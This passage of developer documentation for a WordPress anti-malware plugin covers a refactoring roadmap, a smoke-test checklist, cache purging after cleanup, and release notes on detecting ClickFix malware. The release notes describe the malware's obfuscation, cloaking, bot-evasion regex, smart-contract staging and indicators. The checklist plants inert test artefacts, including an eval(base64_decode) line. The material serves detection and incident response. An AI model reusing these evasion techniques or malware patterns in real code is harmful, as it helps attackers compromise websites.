1. Confirm current ZIP packaging uses `wp-perf-shield/` as the single root folder.
2. Run PHP syntax checks or the local parser fallback on every `.php` file.
3. Run `node --check assets/js/admin.js`.
4. Verify admin tabs still map as `overview`, `diagnostics`, `forensics`, `remediation`, `hardening`, `events`, and `settings`.
5. Confirm `doc/ssot.md` still matches package layout, docs layout, asset layout, tab aliases, and release rules.
6. Record any development-only plan changes in `doc/changelog.md` without bumping the plugin version unless a release package is rebuilt.

Acceptance criteria:

1. All PHP files pass syntax or parser checks.
2. Admin JS passes syntax checks.
3. ZIP root and doc placement are verified.
4. No runtime behavior changes are included in this phase.

### Phase 1: Safety Stabilization

Priority: P0/P1. Complete this before structural refactoring.

1. Add a shared destructive-action guard helper for capability checks, path containment, self-plugin protection, cache clearing, and event logging.
2. Audit every AJAX handler that deletes or replaces data and document its allowed target boundary.
3. Tighten capability checks where safe: plugin deletion, user deletion, attachment deletion, core replacement, and DB cleanup.
4. Keep `manage_options` as a fallback only when a more specific capability is unavailable or would break older installs.
5. Add consistent `wp_unslash()` handling before request sanitization.
6. Add clearer log labels for automatic deletion, manual deletion, cleanup skipped, cleanup failed, and already-gone states.
7. Review hostile-IP blocking UX so an administrator can recover from self-blocking without database access.
8. Redact or minimize sensitive exfil evidence in normal event display while preserving incident-response usefulness.

Acceptance criteria:

1. Confirmed malware auto-delete still works when enabled.
2. Detect-only mode still marks auto-delete as skipped.
3. Legitimate WP Perf Shield release ZIP uploads are not blocked.
4. Known malware ZIPs and renamed ZIPs are still blocked.
5. Hostile-IP clearing remains available from Settings.
6. All destructive AJAX handlers keep nonce checks and capability checks.

### Phase 2: Controller And Service Split

Priority: P1/P2. This is the main architecture cleanup.

1. Create a remediation controller, for example `includes/class-remediation-controller.php`.
2. Move all `wp_ajax_wps_*` remediation handlers out of `wp-perf-shield.php` into the controller without changing action names.
3. Move shared helpers such as remote fetching, path containment, core file validation, and JSON response helpers into a small utility/service class.
4. Keep `wp-perf-shield.php` focused on constants, includes, activation/deactivation/uninstall, cron scheduling, and class registration.
5. Preserve existing JavaScript action names and DOM IDs so the admin UI does not need a simultaneous rewrite.
6. After extraction, run a forced scan, clear log, hardening status, wp-config cleanup dry path, DB option cleanup no-op path, and forensics refresh on a staging site.

Acceptance criteria:

1. `wp-perf-shield.php` no longer contains large inline AJAX remediation closures.
2. Every existing AJAX action name still responds.
3. No button IDs or localized JS config names change.
4. PHP syntax/parser checks pass.
5. Existing logs and cached scan data remain readable.

### Phase 3: Admin View Split

Priority: P2. Do after controller extraction so markup changes are isolated.

1. Split `includes/class-admin.php` into tab renderers or partial templates.
2. Keep the tab order: Overview -> Diagnostics -> Forensics -> Remediation -> Hardening -> Events -> Settings.
3. Preserve aliases: `dashboard -> overview`, `analytics -> diagnostics`, `log -> events`.
4. Move remaining large inline styling into `assets/css/admin.css`.
5. Keep `assets/js/admin.js` as the single admin behavior file unless a clear module split is introduced.
6. Keep destructive-action messages compact and visually consistent.
7. Avoid new heavy work on page load; render cached data and require explicit operator actions for expensive scans.

Acceptance criteria:

1. Every tab renders without PHP warnings.
2. All existing buttons still work.
3. Mobile and desktop layouts do not overflow on long paths, hashes, signatures, or event subjects.
4. CSS/JS asset files remain present and enqueued only on the WP Perf Shield admin screen.

### Phase 4: Indicator Data Split

Priority: P2/P3. Do only after tests or parity checks exist.

1. Move confirmed slugs, suffix patterns, hashes, option keys, handler class names, C2 markers, and known backdoor filenames into versioned indicator data files.
2. Keep the loader read-only and deterministic.
3. Maintain separate confidence classes: confirmed malware, suspicious review-only, high-risk plugin, and local whitelist.
4. Keep path/signature whitelists narrow and auditable.
5. Add a parity test that proves loaded indicators match the current hard-coded behavior before deleting the old arrays.
6. Update `doc/ssot.md`, `readme.txt`, `doc/readme.md`, `doc/upgrading.md`, and `doc/changelog.md` whenever indicator policy changes.

Acceptance criteria:

1. Existing confirmed malware samples are still detected.
2. WP Perf Shield release ZIP self-exemption still works.
3. Known benign local-owner strings are not reintroduced as attacker-account or malware signatures.
4. Indicator files are included in the release ZIP under `wp-perf-shield/`.

### Phase 5: Diagnostics, Export, And Test Harness

Priority: P3. This improves supportability after the core architecture is safer.

1. Add a diagnostics export that includes plugin version, settings, active protections, recent redacted events, blocked IP summaries, scan findings, and environment checks.
2. Do not include raw credentials, auth salts, DB passwords, or full exfil contents in exports.
3. Add a manual smoke-test checklist for local/staging validation.
4. Add automated tests if a WordPress test harness becomes available.
5. Add package verification scripts for root folder, required docs, version markers, and syntax checks.

Acceptance criteria:

1. A support bundle can be generated without exposing secrets.
2. The release process can verify syntax, docs placement, version markers, and ZIP root.
3. The smoke-test checklist covers plugin upload, malware ZIP block, scan, auto-delete, detect-only, hardening, forensics, events, and settings.

### Recommended Agent Prompts

Use these prompts when delegating future phases to Claude Code, Codex, Windsurf, or Antigravity.

Claude Code:

```text
Review WP Perf Shield and implement Phase 1 safety stabilization only. Audit destructive AJAX handlers, tighten capability checks where safe, preserve all action names and UI IDs, update doc/upgrading.md and doc/changelog.md, and do not change malware indicators unless necessary.
```

Codex:

```text
Implement Phase 2 only. Move AJAX remediation handlers from wp-perf-shield.php into a dedicated controller class without changing behavior, action names, nonce names, DOM IDs, or localized JS config. Run PHP syntax/parser checks and JS checks before reporting.
```

Windsurf:

```text
Implement Phase 3 only. Split includes/class-admin.php into tab renderers or partials while preserving the existing admin workflow, tab aliases, button IDs, CSS classes, and JavaScript behavior. Move inline styling into assets/css/admin.css where safe.
```

Antigravity:

```text
Review Phase 1 and Phase 2 changes for destructive-action safety. Check nonce coverage, capability checks, path containment, wp-config.php backup and sanity checks, ZIP self-package exemption, hostile-IP recovery, log sensitivity, and package-root compliance.
```

## Manual Smoke-Test Checklist

Operator-facing validation pass to run on a staging or local site before publishing a release ZIP. Covers the acceptance criteria from Phases 1 through 5 of the controlled development roadmap.

Run on: WordPress 5.8+ with PHP 7.4+, the ZipArchive extension enabled, and a writable `wp-content/plugins/wp-perf-shield/logs/` directory.

### A. Plugin upload and activation

1. Upload `wp-perf-shield-X.Y.Z.zip` via **Plugins -> Add New -> Upload Plugin**. Activate.
2. Confirm a new menu item appears under **Tools -> WP Perf Shield**. (If missing, the bootstrap regression check failed; verify `WPS_Admin::register_hooks()` is wired in `wp-perf-shield.php`.)
3. Confirm `wp-content/plugins/wp-perf-shield/logs/events.php` is created with the PHP guard prefix on first visit.

### B. Tab navigation and aliases

1. Visit each tab in order: Overview, Diagnostics, Forensics, Remediation, Hardening, Events, Settings. Each must render without PHP warnings.
2. Visit `tools.php?page=wp-perf-shield&tab=dashboard` and confirm Overview renders.
3. Visit `tools.php?page=wp-perf-shield&tab=analytics` and confirm Diagnostics renders.
4. Visit `tools.php?page=wp-perf-shield&tab=log` and confirm Events renders.

### C. Scan, auto-delete, detect-only

1. Open **Settings**, confirm "Auto-delete confirmed malware artifacts" is enabled by default.
2. Plant a confirmed malware artefact under `wp-content/plugins/`. Use any of: `wp-perf-analytics-test/`, `native-render-toolkit-9999/`, `total-render-profiler-9999/`. Inside, drop a file `loader.php` containing the strings `polygon-rpc`, `_cf_verified`, and a base64 payload header.
3. Click **Run scan now** on Overview.
4. Expected: the finding is auto-deleted; the events log records `auto_deleted` with `result=deleted` in the subject; the plugin folder is gone from disk.
5. Disable **Auto-delete confirmed malware artifacts**. Plant the same artefact again. Run scan.
6. Expected: the finding is reported but NOT deleted; the events log records `auto_delete_skipped_disabled` with `result=skipped_disabled` in the subject.

### D. Hostile IP blocking and self-recovery

1. Open **Settings**, confirm "Auto-block IPs that attempt known malware uploads" is enabled.
2. From a separate IP (or VPN), upload a known-bad ZIP via **Plugins -> Add New -> Upload Plugin**. Try `wp-perf-analytics.zip` if available, or any ZIP containing one of the indicator strings.
3. Expected: the upload is rejected with a 403; the events log records `ip_auto_blocked` with the source IP; the IP is added to **Settings -> Active hostile IP blocks**.
4. From that IP, attempt any WordPress request. Expected: 403 response; events log records `ip_request_blocked`.
5. Open **Settings -> Danger zone -> Clear hostile IP blocks**. Confirm the IP is removed and a fresh request from it succeeds.

### E. ZIP self-package exemption

1. Build the release ZIP: `tools/verify-package.ps1` first, then zip manually with `wp-perf-shield/` as the only root folder.
2. Re-upload the same ZIP through **Plugins -> Add New -> Upload Plugin**.
3. Expected: the upload succeeds. The plugin's own indicator strings inside its source files do not trigger the upload guard.
4. Now rename a known-malware sample to `wp-perf-shield.zip` and try uploading.
5. Expected: rejected. The self-package check requires the real `wp-perf-shield/wp-perf-shield.php` plugin header AND the `WPS_VERSION` define; a renamed payload does not satisfy both.

### F. wp-config.php hardening writes

Run each in turn against the same wp-config.php; back up the file before starting.

1. **Hardening -> Apply DISALLOW_FILE_MODS**. Verify the line is added to wp-config.php; verify a backup exists at `wp-config.php.wps.bak` (or `wp-config.php.wps-YYYYMMDD-HHMMSS.bak` if a previous backup exists). Verify the file still parses (`php -l wp-config.php`).
2. **Hardening -> Apply FORCE_SSL_ADMIN**. Verify the second backup uses a versioned name and does NOT overwrite the first backup.
3. **Hardening -> Regenerate auth salts**. Verify the eight salt define lines are replaced; verify the file still parses; verify any active session is now invalidated (re-login prompted).
4. Edit wp-config.php manually to introduce a malformed line. Click **Hardening -> Apply DISALLOW_FILE_EDIT**.
5. Expected: the action refuses with "Edited wp-config.php failed sanity checks. No changes were written." The file is left unchanged.

### G. wp-config.php cleanup

1. Add a known-removable malware line to wp-config.php: `@eval(base64_decode('Zm9vYmFy'));`.
2. **Remediation -> Clean wp-config.php**.
3. Expected: the line is removed; a versioned backup is created; the events log records `wp_config_cleaned`; the cached scan transient is invalidated.
4. Without any removable patterns present, click **Clean wp-config.php** again.
5. Expected: the action returns "No known removable wp-config.php malware patterns were found" and the events log records `wp_config_clean_skipped`. wp-config.php is unchanged.

### H. Forensics

1. **Forensics -> Run forensics**. Confirm the cached report renders the eight cards (media uploads, plugin file timestamps, admin accounts, wp-cron integrity, theme tampering, DB anomalies, automated PHP checks, core integrity) and the SSH command list.
2. Confirm any inline action button on a forensics row works (Delete attachment, Delete folder, Delete now for DB option, etc.).

### I. Diagnostics export

1. **Settings -> Diagnostics export -> Download support bundle (JSON)**.
2. Open the downloaded file. Confirm:
   - `plugin_version` matches the installed version.
   - `indicator_version` is present.
   - `settings.extra_slugs_count` is a number, not raw slug content (count only, redacted).
   - `recent_events` does NOT contain any `exfil_file_read` rows.
   - `blocked_ips` rows include IP and counts but no proxy headers, no user-agent strings.
   - There is no `DB_PASSWORD`, `AUTH_KEY`, `NONCE_SALT`, or any value matching `[A-F0-9]{32}` longer than a hash field.

### J. Events log

1. **Events -> Clear log**. Confirm the log is empty.
2. Trigger any logged action (run scan, apply a hardening rule, etc.). Confirm the new event appears at the top of Events.
3. Confirm the log file at `wp-content/plugins/wp-perf-shield/logs/events.php` still starts with `<?php exit; ?>` after the action.

### K. Banned plugins (site policy)

1. In **Settings -> Banned plugins**, confirm the list is enforced (on by default) and the description names `wp-file-manager` and `filebird` as the built-in bans.
2. Try uploading `wp-file-manager.zip` (or any ZIP whose root folder is `wp-file-manager/`) via **Plugins -> Add New -> Upload Plugin**. Expected: rejected with "This plugin is banned by site policy and was not uploaded." — **not** the malware message.
3. Confirm the Events log shows a `policy_upload_blocked` entry at *warning* severity, worded as a policy decision, and that **Diagnostics -> Active hostile IP blocks does not list your address** as a result of the refusal.
4. If a banned plugin is already present but inactive, confirm its **Activate** link is replaced with "⛔ Banned by site policy" and that forcing activation is refused with the policy message and a `policy_activation_blocked` event.
5. Activate a banned plugin by writing it directly into `active_plugins`, then load any page. Expected: it is force-deactivated, with a `policy_force_deactivated` event.
6. Add a throwaway slug under **Additional banned slugs**, save, and confirm an upload/activation of that slug is refused too. Remove it and confirm the refusal stops.
7. Untick "Enforce the banned list", save, and confirm both defaults can now be uploaded and activated — the switch is a real off state, not cosmetic.

### L. Final integrity

1. Run the package verification script: `pwsh tools/verify-package.ps1` (or `powershell -ExecutionPolicy Bypass -File tools/verify-package.ps1`). Every check must pass.
2. Run `php -l` on every PHP file in the package. Every file must report "No syntax errors detected".
3. Compare the indicator version from the diagnostics export against `WPS_Indicators::INDICATOR_VERSION` in source. They must match.

If every section above passes, the build is ready to publish.

## Post-Remediation Cache Invalidation Checklist

This section captures an operational lesson from active incident response on the muslimapologist.online network during the 1.3.57 audit cycle. The lesson is simple, common, and worth documenting because it bites operators reliably: cleanup at the WordPress layer does not flush every cache layer that may have stored a copy of the infected page. After a successful remediation, the site can still serve the malicious payload to visitors for hours until each cache layer is explicitly invalidated.

The specific incident that motivated this section: an operator ran the WP Perf Shield 1.3.57 scan on the first victim site, the scan caught and removed every IoC-catalogued artefact, the diagnostics export verified all standard injection sites clean, the wp-cron.php / theme functions.php / core file integrity all matched expected checksums, no fake plugins or hidden admin users remained, no PHP files in uploads, no mu-plugins backdoors. By every plugin-side measure the cleanup was complete. The operator then opened the site in a regular browser window and the ClickFix popup was still appearing. Resolution was a browser cache clear; the popup vanished immediately.

The cleanup had worked. The popup was a stale cached copy of the pre-cleanup page being served from the browser's own cache. If the operator had not tested the cleanup thoroughly, the false impression of "the malware is back" could have triggered a second round of remediation chasing a phantom that was never on disk anymore.

Cache layers that retain copies of WordPress-rendered HTML in a Plesk-managed WordPress installation behind Cloudflare typically include, in roughly the order data flows out from origin to visitor:

1. Object cache (Redis / Memcached / Performance Lab object-cache.php drop-in). Stores rendered fragments and database query results. Cleared by purging the object cache plugin's cache or restarting Redis/Memcached.
2. Page cache plugin (W3 Total Cache, WP Super Cache, LiteSpeed Cache, WP-Optimize, Hummingbird, SG Optimizer, etc.). Stores fully-rendered HTML pages on disk inside `wp-content/cache/`. Cleared via the plugin's "Empty all caches" or "Purge all" button.
3. Plesk WP Toolkit caching panel. Stores its own page cache layer when enabled. Cleared via the WP Toolkit Caching tab on the domain in Plesk.
4. PHP OPcache. Caches compiled PHP bytecode. Will not retain malicious HTML output, but if the malware was injected directly into a PHP file (theme `functions.php`, a fake plugin's main file) and the file has since been cleaned, OPcache may still execute the old bytecode until reset. Cleared by PHP-FPM reload, `opcache_reset()`, or a fresh request after the configured `opcache.revalidate_freq`.
5. Reverse proxy cache. Plesk installations often have a Nginx reverse proxy in front of Apache; the Nginx layer can have its own cache. Cleared by `service nginx reload` or via the Plesk Apache & Nginx Settings panel.
6. CDN edge cache. Cloudflare, Bunny CDN, KeyCDN, etc. cache HTML at every edge POP worldwide. Clearing edge cache is the single highest-leverage step because CDN HTML can survive for hours even after origin is clean. Cleared via Cloudflare dashboard → Caching → Configuration → Purge Everything (or selective Purge by URL for individual pages).
7. Browser cache and Service Worker cache. The visitor's own browser stores the page locally. Cleared by hard refresh (`Ctrl+Shift+R`), private/incognito window, or a manual browser cache clear. Service Workers cache aggressively and survive cache clears unless deregistered; some malware variants register a service worker specifically to persist across cleanups.

Standard checklist after every remediation pass.

The operator's checklist below should run in this exact order, because each step's effectiveness depends on the previous steps. Clearing the browser cache without first clearing CDN cache means the next page load just refetches the cached-bad HTML from the CDN. Clearing CDN cache without clearing the page cache plugin means the CDN refetches the cached-bad HTML from origin. Clearing the page cache without clearing the object cache means the page cache regenerates from already-poisoned object cache fragments. The order matters.

1. Object cache. If Redis Object Cache, W3 Total Cache, LiteSpeed Cache, or any other object-cache plugin is installed, click its "Flush Cache" button. Without this step, fragments rendered from poisoned cached database query results survive into the regenerated page cache.
2. Page cache. Use the page-cache plugin's purge action: W3 Total Cache → Performance → Dashboard → Empty all caches. WP Super Cache → Settings → WP Super Cache → Easy → Delete cache. LiteSpeed Cache → Toolbox → Purge → Purge all. WP-Optimize → Cache → Purge cache. Verify the `wp-content/cache/` directory is empty or contains only fresh post-cleanup files.
3. Plesk WP Toolkit cache. In the Plesk panel, the domain's WP Toolkit page → Caching tab → Disable & Re-enable, or click the explicit Purge action if available. Skip this step if Plesk caching is not enabled.
4. PHP OPcache. Either restart PHP-FPM (`systemctl reload php-fpm` or via Plesk → Tools & Settings → Service Management), or call `opcache_reset()` from a temporary diagnostic PHP file, or wait for the configured `opcache.revalidate_freq` to elapse (usually 60 seconds on default Plesk configs). Without OPcache reset, an injected `functions.php` that was cleaned on disk may continue to execute its old bytecode for up to the revalidate interval.
5. Nginx reverse proxy. If Plesk uses Nginx in front of Apache: `systemctl reload nginx`. If Nginx is the only web server: same command. Without this step, an Nginx-cached response can survive Apache-side cleanup.
6. Cloudflare edge cache. Cloudflare dashboard → select the affected domain → Caching → Configuration → "Purge Everything" button. Confirm the purge. Alternative for a single page: Custom Purge → enter the specific URL(s) showing the malware. Cloudflare cache TTL on free plans defaults to several hours for HTML; without explicit purge, edge nodes worldwide will continue serving the cached-bad HTML to visitors.
7. Browser cache and service workers. In the testing browser: open Developer Tools → Application tab → Storage → Clear site data (Chromium-based browsers); or in Firefox: Developer Tools → Storage → right-click site → Delete All. This also unregisters any service workers the malware may have installed. For a quick smoke test, an incognito/private window with extensions disabled is sufficient and does not affect the operator's regular browsing profile.

Verification.

After steps 1 through 7, open an incognito or private window with no browser extensions, navigate to the cleaned site, and:

1. View the page as a logged-out visitor. ClickFix variants explicitly exclude logged-in admins, REST/AJAX/cron, role-bearing logged-in users, bots, and visitors carrying the `_cf_verified` or `_wp_perf_ok` dismiss cookie; an admin testing in their normal browser would not see the popup even if the malware were active. Incognito with no cookies is the correct test condition.
2. If the popup does not appear in incognito after the cache invalidation pass, the cleanup is complete and the previous appearance was a cache artefact.
3. If the popup still appears after the cache invalidation pass, the injection is somewhere outside the current IoC catalogue. Capture the page View Source, find the literal HTML of the popup or the script tag that produces it, and report the injection location to the WP Perf Shield maintainer for inclusion in the next release. Most likely candidates that the catalogue does not yet cover specifically: header/footer code injection via plugins like Insert Headers and Footers or Code Snippets, Theme Customizer Additional CSS containing JavaScript via legacy CSS expressions, Active widget custom-HTML containing script tags, Custom-link menu items with `javascript:` URLs.

Why this checklist is documented at the project level rather than the per-release level.

Cache invalidation is not specific to any version of WP Perf Shield. The plugin already invalidates the WordPress object cache and `wps_scan_results` transient after every remediation action via `wp_cache_flush()` and `delete_transient()`, but the plugin cannot directly purge external page-cache plugins, the Plesk WP Toolkit cache, the Nginx reverse-proxy cache, the Cloudflare edge cache, or any visitor's browser cache. These layers are operator-managed and require operator-initiated purges. Documenting the checklist at the project level keeps the guidance discoverable across every future release rather than burying it in the changelog of the version where the lesson was first learned.

## From 1.3.77 to 1.3.78+

Version 1.3.78 is a detection release driven by a live sample captured from an infected Malaysian site (rembat.my). It is the same ClickFix render-hijacker family the plugin targets, but evolved in two ways that defeated the literal signatures already in the catalogue. The release adds structure-based detection that survives the evolution. Sections 1.3.69 through 1.3.77 are recorded only in `doc/changelog.md` and `doc/ssot.md`; this entry resumes the per-release upgrade notes for the current release.

What the sample was. A `<script>` appended before `</body>` on every page, obfuscated as base64 wrapped in a single-byte XOR (key 179) feeding `new Function(new TextDecoder().decode(...))`. De-obfuscated, it is the desktop-only ClickFix lure: it returns early on mobile/tablet and on iOS/Android, runs an anti-debugger timing check, sets and checks dismissal cookies `_cf_verified` and `_wp_perf_ok`, and fetches its next-stage URL from a Polygon smart contract (`0x08207B087F61d7e95E441E15fd6d40BEfd6eD308`, selector `0x38bcdc1c`) via `eth_call` across six public Polygon RPC nodes, an EtherHiding move off the earlier Binance Smart Chain variant. It then paints a full-screen iframe overlay with `allow="clipboard-write"` and waits for a `cf-captcha-verified` postMessage.

Why 1.3.77 would have missed it. Two structural reasons, both verified. First, the two wrapper signatures (`s.charCodeAt(i)^k` and `new TextDecoder().decode(r)`) are literal and assume one sample's variable names; this variant randomised them (`_daa77`, `_6a70`, `_0695`, `_db937`), so a `strpos` match fails. Second, the cleartext indicators already in the signature list (`_wp_perf_ok`, `eth_call`, the contract, `cf-captcha-verified`) live inside the base64 blob in the file, so a raw substring scan never reaches them.

What it does. Two changes. First, `WPS_Indicators::etherhiding_indicators()` gains the six Polygon RPC hosts (`polygon.drpc.org`, `polygon-bor-rpc.publicnode.com`, `polygon.lava.build`, `polygon.rpc.subquery.network`, `polygon-public.nodies.app`, `polygon-pokt.nodies.app`) alongside the existing BSC hosts, and the `eth_call` primitive is matched as a bare substring so it catches both quote styles. Second, a new pipeline check `check_obfuscated_loader()` detects the loader by structure rather than variable names: a file must carry an atob/base64_decode blob, a `charCodeAt(...)^key` XOR loop, a TextDecoder/fromCharCode pass, and a `new Function()`/`eval()` sink. On a structural match it base64-decodes each blob and brute-forces the single-byte XOR, recovering the payload, the key, the contract address, and the chain RPC hosts; a recovered campaign indicator is treated as proof (critical), while structure-without-recovery is reported high for manual review.

Why it does not auto-delete. The loader is sometimes a standalone dropped file (a fake plugin, an mu-plugin, or a wp-content drop-in) where deletion is correct, but it is also sometimes appended to a legitimate file such as a theme `functions.php`, where only the injected block should be removed. The check cannot reliably distinguish the two, so it reports with the recovered details and leaves the decision to the operator rather than risking deletion of a legitimate file.

Performance and false positives. The cheap structural regex gate runs per PHP file under `wp-content` (bounded by the existing scan-file cap and a 2 MiB per-file size cap); the costly base64-and-XOR brute runs only on the few files that already match the full structure. The gate requires four independent patterns to co-occur, and the critical verdict requires a decoded campaign indicator, so false positives on legitimate code are very unlikely.

What 1.3.78 does NOT change. No new features, UI, AJAX handlers, options, or schema. No capability or nonce-model changes. No effect on the 1.3.76 CSP feature, the 1.3.73 Logs tab, or any prior remediation behaviour. The 1.3.57 audit's residual-risk acceptances stand.

Acceptance criteria for 1.3.78:

1. `WPS_Indicators::etherhiding_indicators()` includes the six Polygon RPC hosts and matches `eth_call` as a bare substring.
2. `WPS_Scanner::check_obfuscated_loader()` exists and is registered in the scan pipeline.
3. The structural gate requires atob/base64_decode, a `charCodeAt(...)^` loop, a TextDecoder/fromCharCode pass, and a `new Function()`/`eval()` sink to co-occur.
4. On a structural match the check base64-decodes and XOR-brute-forces the blob, recovers the key/contract/chain hosts, and treats a recovered campaign indicator as a critical finding; structure-without-recovery is high.
5. The check does not auto-delete.
6. `WPS_Indicators::INDICATOR_VERSION` is `1.3.78-1`.
7. PHP parser fallback (`tools/verify-package.ps1`) and `php -l` pass on the changed files.
8. Plugin header, `WPS_VERSION`, WordPress readme stable tag, and project docs all read `1.3.78`.

## From 1.3.67 to 1.3.68+

Version 1.3.68 is a pure IoC catalogue release. It closes detection and removal coverage for the full 2026-05 ClickFix sample batch, including one previously-unknown family member (`pro-cache-scanner`) and two pre-existing signature-layer gaps (auto-content-profiler missing from the ZIP content signature list, and five family slugs missing from the local fallback substring array in `check_htaccess_false_security`).

What it does. The 2026-05 sample batch comprised ten ClickFix-family ZIPs captured from operator infrastructure. Nine were already covered at every layer of the plugin from prior releases (1.3.37 added Advanced Asset Insights coverage, 1.3.39 added Page SEO Toolkit and Starter Image Guard, 1.3.58 added Auto Content Profiler). One sample, `pro-cache-scanner-6d52.zip`, did not match any existing slug, pattern, hash, content signature, persistence option, or shell-author entry. The 1.3.68 release adds it at every layer.

Pro Cache Scanner specifics. The sample is a single-file plugin (9,561 bytes, MD5 `15e17041c615dc272d5cd5ac3bcd5d6f`, SHA-256 `894108561a3b5be93a76ce2bda74602ed5b5305649aae65b43460565ca220201`) authored by "Net IO" with the canonical `Plugin URI: https://developer.wordpress.org/plugins/` copy-paste tell. Handler class `Health_Proc_1e3d` reads `get_option('wp_3093c104e2_cfg', '')`, base64-decodes the payload, re-seeds the option from a hardcoded blob on first run via `update_option(..., 'no')`, and registers `wp_footer` at priority 91490. The `render` method applies the canonical six-condition cloak (skip admin/AJAX/cron/REST, skip logged-in administrators/editors/authors, skip the family bot regex `bot|crawl|spider|lighthouse|pagespeed|semrush|ahrefs|mj12|dotbot|bingpreview|slurp|yandex|duckduck|facebookexternalhit|twitterbot|whatsapp|telegram|googlebot`, skip when cookie `_cf_verified` or `_wp_perf_ok` is present) before injecting a `<script>` tag carrying the multi-stage base64+XOR-lookup payload. Function names are built via `chr()` concatenation and string literals are split with the `.` operator to evade literal-substring scanners. The structural heuristic introduced in 1.3.58 catches this shape independently of any prior knowledge of the slug or content; the 1.3.68 catalogue additions are belt-and-braces high-confidence detection.

Why the persistence option matters. Even after the dropper PHP file is deleted, the `wp_3093c104e2_cfg` row in `wp_options` survives. The next dropper variant uploaded under any slug reads the same option key and self-heals its payload without contacting any remote source. The 1.3.68 addition of `wp_3093c104e2_cfg` to `WPS_Indicators::malware_option_keys()` lets the existing per-row delete handler (`wps_delete_single_option`) and bulk delete handler (`wps_delete_db_options`) clear this option through the same code path used for every other ClickFix sibling. Deleting the file alone, without deleting the option row, is pointless.

Pre-existing signature-layer gaps closed. The Auto Content Profiler family (added 1.3.58) was covered at the slug, pattern, hash, and option-key layers, but its Plugin Name string `Auto Content Profiler`, slug `auto-content-profiler`, persistence option key `wp_e07ded4e61_cfg`, and handler class name `DB_Worker_1c49` were missing from `WPS_Blocker::zip_content_signature`. Renamed-ZIP uploads carrying this content under an unfamiliar filename would not have been caught by content inspection. 1.3.68 adds all four. Separately, the local `$malware_patterns` array inside `check_htaccess_false_security` (the warning that fires when an operator drops a `Deny from all` rule into a malware plugin's `.htaccess` believing it neutralises the threat) was missing five family slugs already present in the central Blocker slug list: `advanced-asset-insights`, `page-seo-toolkit`, `starter-image-guard`, `auto-content-profiler`, and the new `pro-cache-scanner`. 1.3.68 syncs the local list.

Shell-author corpus expanded. The six-trait structural heuristic uses a known-shell-author list as a bonus trait. The 2026-05 sample batch revealed six new Author values: `Developer Tools Team` (wp-perf-analytics gen-1), `Smart Software` (native-render-toolkit-9401), `Auto Labs` (pro-font-optimizer-c88b), `Auto Studio` (site-speed-insights-d6e7), `Pro Works` (total-render-profiler-3753), `Net IO` (pro-cache-scanner-6d52). All six are added to `clickfix_known_shell_authors()`. None of these names overlaps with any known legitimate WordPress plugin author the maintainer has seen; they are generic shell-company labels.

What 1.3.68 does NOT change. No new features. No UI changes. No new finding types. No new AJAX handlers. No capability changes. No nonce model changes. No effect on the 1.3.67 surgical-edit Clean buttons, the 1.3.66 tab regrouping, the 1.3.65 onclick fix, or any prior remediation behaviour. No effect on the structural-trait heuristic logic itself; only the shell-author bonus list and the local fallback substring array were touched. The 1.3.57 audit's residual-risk acceptances stand.

Acceptance criteria for 1.3.68:

1. `WPS_Indicators::malware_option_keys()` includes `wp_3093c104e2_cfg`.
2. `WPS_Blocker::get_blocked_slugs()` includes `pro-cache-scanner`.
3. `WPS_Blocker::get_patterns()` includes the two `pro-cache-scanner` suffix-rotation regexes.
4. `WPS_Blocker::get_blocked_hashes()` includes both the MD5 and the SHA-256 for the sample.
5. `WPS_Blocker::zip_content_signature()` includes `wp_3093c104e2_cfg`, `Health_Proc_1e3d`, `Pro Cache Scanner`, and `pro-cache-scanner`.
6. `WPS_Blocker::zip_content_signature()` includes `wp_e07ded4e61_cfg`, `DB_Worker_1c49`, `Auto Content Profiler`, and `auto-content-profiler` (closes the auto-content-profiler signature-layer gap).
7. The local `$malware_patterns` array in `check_htaccess_false_security` includes `advanced-asset-insights`, `page-seo-toolkit`, `starter-image-guard`, `auto-content-profiler`, and `pro-cache-scanner`.
8. `clickfix_known_shell_authors()` includes `Developer Tools Team`, `Smart Software`, `Auto Labs`, `Auto Studio`, `Pro Works`, and `Net IO`.
9. PHP parser fallback (`tools/verify-package.ps1`) passes on all 20 PHP files.
10. `WPS_Indicators::INDICATOR_VERSION` is `1.3.68-1`.
11. Plugin header, `WPS_VERSION`, WordPress readme stable tag, and project docs all read `1.3.68`.

## From 1.3.66 to 1.3.67+

Version 1.3.67 implements the surgical-edit "Clean injection" buttons that have been deferred since 1.3.61. This is the largest functional change since 1.3.61's inline-delete-button addition and the first new feature shipped under the post-1.3.65 verification discipline.

What it does. Two new finding-card buttons let an operator one-click-remediate two specific malware patterns in the auto_prepend_file hijack chain. The first handles non-canonical `include` lines added to wordfence-waf.php (the "wrapper hijack"). The second handles non-canonical `auto_prepend_file` directives in .user.ini. Each button is rendered when the scanner emits a finding with a corresponding `clean_strategy` field; the field was added to the relevant findings in `includes/class-scanner.php`.

Why this set of two. The auto_prepend_file hijack chain is the dominant attack pattern in MENJ's network of sites. It typically involves three pieces: (a) a malicious `include` line added to wordfence-waf.php, (b) a malicious `auto_prepend_file = <path>` directive in .user.ini, (c) a payload PHP file at the include target. Piece (c) is already auto-deleted by the existing scanner+remediation flow when it sits at ABSPATH-root with a known toolkit filename. Pieces (a) and (b) require surgical editing because the host files are legitimate and have other content. The 1.3.67 buttons close those two gaps. .htaccess-based variants of (b) are deliberately NOT covered because operator-edited .htaccess files contain heterogeneous rewrite rules whose interaction with surgical line-removal is unpredictable.

Recognised cleanable patterns for wordfence-waf.php. Two regex patterns are tried in sequence per line. The line must match one of them AND contain the offending include target captured by the scanner (passed in the POST body as `match`).

The first is the "bare include" form: an include or require directive on its own line, optionally `@`-suppressed, optionally with parentheses, optionally with `_once`, optionally with a trailing semicolon, surrounding whitespace tolerated. Examples: `include('/p.php');`, `@include_once "/p.php"`, `REQUIRE('/p.php')`, `include /p.php`.

The second is the "file_exists wrapper" form, the dominant in-the-wild pattern: `if (file_exists('<offending>')) include('<offending>');` and the brace-wrapped variant `if (file_exists('<offending>')) { include('<offending>'); }`. Both halves of the line MUST reference the SAME offending path. This is what distinguishes the malware idiom from legitimate code that might happen to file_exists-and-include something with different paths in each half. Optional `@` suppression, optional `_once` suffix, case-insensitive, surrounding whitespace tolerated.

